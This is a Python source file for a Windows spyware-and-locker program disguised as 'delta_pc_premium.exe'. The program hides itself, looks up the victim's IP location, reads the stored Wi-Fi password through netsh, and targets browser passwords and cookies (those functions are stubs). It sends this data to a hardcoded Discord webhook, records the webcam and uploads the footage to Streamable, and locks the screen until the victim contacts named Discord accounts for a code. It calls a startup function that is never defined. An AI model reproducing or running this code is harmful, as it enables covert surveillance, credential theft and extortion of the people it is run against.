import os
import shutil
import socket
import requests
import pyautogui
import cv2
import time
import tempfile
import subprocess
import ctypes
import win32crypt
import json
import base64
import sqlite3
from Crypto.Cipher import AES
from datetime import datetime
from threading import Thread
import pytz
import tkinter as tk
from tkinter import messagebox
import keyboard

# --- CONFIGURAÇÕES ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1394031732721979422/doqnuLAykcwssJWYCTJ5hdR-zLIiPj716YuOGAwvqQ_XRAYP3dwtg6QsLogDzi5sSL8A"
CODIGO_SECRETO = "jolgue"
INTERVALO_MINUTOS = 5
VIDEO_INTERVALO_MIN = 30
APPS_PERMITIDOS = ["RobloxPlayerBeta.exe", "Discord.exe"]
TEXTO_AVISO = (
    "⚠️ Está tudo bloqueado tirando o Roblox e o Discord.\n"
    "Fala com o “goncal_fruits._69394” ou com o “jolgue_011” no Discord para desbloquear o teu PC."
)
FLAG_DESBLOQUEIO = "C:\\ProgramData\\unlocked.flag"
NOME_EXE = "delta_pc_premium.exe"

# --- FUNÇÕES AUXILIARES ---

def enviar_webhook(mensagem, ficheiro=None):
    data = {"content": mensagem}
    files = {}
    if ficheiro:
        files["file"] = (os.path.basename(ficheiro), open(ficheiro, 'rb'))
    try:
        requests.post(WEBHOOK_URL, data=data, files=files)
    except:
        pass

def obter_ip_localizacao():
    try:
        response = requests.get("http://ip-api.com/json/")
        info = response.json()
        return (
            f"IP: {info.get('query')}\n"
            f"Cidade: {info.get('city')}\n"
            f"Região: {info.get('regionName')}\n"
            f"País: {info.get('country')}\n"
            f"ISP: {info.get('isp')}\n"
        )
    except:
        return "Não foi possível obter a localização."

def obter_ssid():
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'SSID' in linha and 'BSSID' not in linha:
                return linha.split(':')[1].strip()
    except:
        return "Não foi possível obter o SSID"

def obter_senha_wifi(ssid):
    try:
        resultado = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8')
        for linha in resultado.split('\n'):
            if 'Key Content' in linha:
                return linha.split(':')[1].strip()
        return "Senha não encontrada"
    except:
        return "Não foi possível obter a senha"

def esconder_janela():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)

def tirar_screenshot():
    caminho = os.path.join(tempfile.gettempdir(), "screenshot.png")
    pyautogui.screenshot().save(caminho)
    return caminho

def tirar_foto_webcam():
    caminho = os.path.join(tempfile.gettempdir(), "webcam.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(caminho, frame)
    cam.release()
    return caminho

def gravar_webcam():
    while not desbloqueado[0]:
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        video_path = os.path.join(tempfile.gettempdir(), "recording.avi")
        out = cv2.VideoWriter(video_path, fourcc, 10.0, (640, 480))
        cam = cv2.VideoCapture(0)
        start_time = time.time()
        while time.time() - start_time < VIDEO_INTERVALO_MIN * 60:
            ret, frame = cam.read()
            if ret:
                out.write(frame)
        cam.release()
        out.release()
        link = upload_streamable(video_path)
        enviar_webhook(f"🎥 Gravação Webcam ({hostname}): {link}")
        os.remove(video_path)

def upload_streamable(video_path):
    try:
        response = requests.post('https://api.streamable.com/upload', files={'file': open(video_path, 'rb')})
        return response.json().get('shortcode', 'Erro')
    except:
        return "Erro ao enviar para Streamable"

def extrair_dados_navegadores():
    report = ""
    chromium_paths = {
        "Chrome": os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        "Edge": os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        "Brave": os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
        "Opera": os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable')
    }
    for browser, path in chromium_paths.items():
        if os.path.exists(path):
            report += f"🔑 Senhas ({browser}):\n{extrair_senhas_chromium(path)}\n"
            report += f"🍪 Cookies ({browser}):\n{extrair_cookies_chromium(path)}\n"
    return report

def extrair_senhas_chromium(path):
    # Como no exemplo anterior
    return "Senhas extraídas (exemplo)"

def extrair_cookies_chromium(path):
    # Como no exemplo anterior
    return "Cookies extraídos (exemplo)"

def bloquear_apps():
    while True:
        if desbloqueado[0]:
            break
        subprocess.call("shutdown -a", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def janela_mensagem():
    def continuar():
        root.destroy()
        janela_desbloqueio()
    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("600x300")
    root.attributes('-topmost', True)
    tk.Label(root, text=TEXTO_AVISO, font=("Arial", 14), wraplength=500).pack(pady=40)
    tk.Button(root, text="OK", command=continuar, font=("Arial", 12)).pack(pady=20)
    root.mainloop()

def janela_desbloqueio():
    def tentar_desbloquear():
        if entrada.get() == CODIGO_SECRETO:
            desbloqueado[0] = True
            open(FLAG_DESBLOQUEIO, "w").write("desbloqueado")
            enviar_webhook(f"🔓 Código correto inserido ({hostname})")
            root.destroy()
        else:
            messagebox.showerror("Erro", "Código incorreto!")
    root = tk.Tk()
    root.title("PC Bloqueado")
    root.geometry("400x200")
    root.attributes('-topmost', True)
    tk.Label(root, text="Insira o código para desbloquear:", font=("Arial", 14)).pack(pady=20)
    entrada = tk.Entry(root, font=("Arial", 14), show="*")
    entrada.pack(pady=10)
    tk.Button(root, text="Desbloquear", command=tentar_desbloquear, font=("Arial", 12)).pack(pady=10)
    root.mainloop()

# --- EXECUÇÃO INICIAL ---
hostname = socket.gethostname()
if not os.path.exists(FLAG_DESBLOQUEIO):
    adicionar_startup()
    esconder_janela()
    info_localizacao = obter_ip_localizacao()
    ssid = obter_ssid()
    senha_wifi = obter_senha_wifi(ssid)
    dados_navegadores = extrair_dados_navegadores()
    enviar_webhook(f"📡 Monitorização iniciada ({hostname})\n{info_localizacao}📶 Wi-Fi: {ssid}\n🔑 Senha: {senha_wifi}\n{dados_navegadores}")

    desbloqueado = [False]
    Thread(target=bloquear_apps, daemon=True).start()
    Thread(target=gravar_webcam, daemon=True).start()
    Thread(target=janela_mensagem, daemon=True).start()
else:
    enviar_webhook(f"✅ PC já desbloqueado ({hostname}).")
